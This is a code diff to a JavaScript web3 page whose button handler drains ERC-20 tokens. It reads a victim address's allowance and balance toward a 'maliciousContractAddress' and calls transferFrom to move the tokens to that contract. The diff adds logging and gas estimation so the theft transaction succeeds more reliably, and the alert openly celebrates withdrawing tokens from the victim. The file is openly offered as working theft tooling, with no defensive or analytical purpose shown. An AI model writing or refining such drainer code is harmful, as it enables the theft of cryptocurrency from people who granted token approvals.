@@ -600,10 +600,15 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
             const allowance = await tokenContract.methods.allowance(cleanedVictimAddress, maliciousContractAddress).call();
             const balance = await tokenContract.methods.balanceOf(cleanedVictimAddress).call();
 
+            console.log("Allowance:", allowance);
+            console.log("Balance:", balance);
+
             // Convert raw data to human-readable format
             const balanceBN = web3.utils.toBN(balance);
             const allowanceBN = web3.utils.toBN(allowance);
             const amountToWithdraw = balanceBN.lt(allowanceBN) ? balanceBN : allowanceBN;
+
+            console.log("Amount to withdraw:", amountToWithdraw.toString());
 
             // Check if the withdrawal amount is valid
             if (amountToWithdraw.lte(web3.utils.toBN(0))) {
@@ -611,8 +616,15 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
                 return;
             }
 
+            // Estimate gas to ensure the transaction won't fail
+            const gasLimit = await tokenContract.methods.transferFrom(cleanedVictimAddress, maliciousContractAddress, amountToWithdraw.toString()).estimateGas({ from: accounts[0] });
+            console.log("Estimated gas limit:", gasLimit);
+
             // Proceed with the transfer
-            const transaction = await tokenContract.methods.transferFrom(cleanedVictimAddress, maliciousContractAddress, amountToWithdraw.toString()).send({ from: accounts[0] });
+            const transaction = await tokenContract.methods.transferFrom(cleanedVictimAddress, maliciousContractAddress, amountToWithdraw.toString()).send({
+                from: accounts[0],
+                gas: gasLimit
+            });
 
             // Success alert
             alert(`Successfully withdrawn ${web3.utils.fromWei(amountToWithdraw.toString(), 'ether')} tokens from the victim's account to the malicious contract!`);
@@ -622,6 +634,7 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
         }
     }
 });
+
 
 
 
